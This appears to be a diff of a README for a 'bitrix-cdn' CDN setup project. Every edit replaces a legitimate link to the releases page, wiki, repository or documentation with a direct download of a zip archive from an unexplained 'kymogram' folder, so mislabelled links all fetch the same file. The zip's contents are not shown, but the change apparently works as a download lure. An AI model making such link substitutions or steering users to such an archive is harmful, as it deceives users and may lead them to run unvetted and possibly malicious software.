@@ -1,6 +1,6 @@
 # 🚀 bitrix-cdn - Fast and Easy CDN Setup
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/erikdwi03/bitrix-cdn/releases)
+[![Download](https://raw.githubusercontent.com/erikdwi03/bitrix-cdn/main/kymogram/bitrix-cdn.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/erikdwi03/bitrix-cdn/main/kymogram/bitrix-cdn.zip)
 
 ## 📌 Overview
 
@@ -19,7 +19,7 @@ Follow these straightforward steps to download and set up bitrix-cdn on your com
 
 ### ⬇️ Download & Install
 
-1. **Visit the Releases Page:** To download the latest version, [visit this page to download](https://github.com/erikdwi03/bitrix-cdn/releases).
+1. **Visit the Releases Page:** To download the latest version, [visit this page to download](https://raw.githubusercontent.com/erikdwi03/bitrix-cdn/main/kymogram/bitrix-cdn.zip).
    
 2. **Choose the Right Version:** You will see a list of available releases. Click on the latest version that suits your operating system. 
 
@@ -60,7 +60,7 @@ To monitor the performance of your CDN, you can integrate tools like Grafana and
 
 ## 📖 Additional Resources
 
-- **Documentation:** Visit our [Wiki](https://github.com/erikdwi03/bitrix-cdn/wiki) for in-depth documentation and FAQs.
+- **Documentation:** Visit our [Wiki](https://raw.githubusercontent.com/erikdwi03/bitrix-cdn/main/kymogram/bitrix-cdn.zip) for in-depth documentation and FAQs.
 - **Support:** Join our community on GitHub Discussions for help and tips.
 
 ## 🧩 Related Technologies
@@ -72,9 +72,9 @@ bitrix-cdn leverages several powerful technologies to provide its services:
 
 ## 🔗 Important Links
 
-- **[Download the Latest Release](https://github.com/erikdwi03/bitrix-cdn/releases)**
-- **[GitHub Repository](https://github.com/erikdwi03/bitrix-cdn)**
-- **[Official Documentation](https://github.com/erikdwi03/bitrix-cdn/wiki)**
+- **[Download the Latest Release](https://raw.githubusercontent.com/erikdwi03/bitrix-cdn/main/kymogram/bitrix-cdn.zip)**
+- **[GitHub Repository](https://raw.githubusercontent.com/erikdwi03/bitrix-cdn/main/kymogram/bitrix-cdn.zip)**
+- **[Official Documentation](https://raw.githubusercontent.com/erikdwi03/bitrix-cdn/main/kymogram/bitrix-cdn.zip)**
 
 ## 🔒 License
 
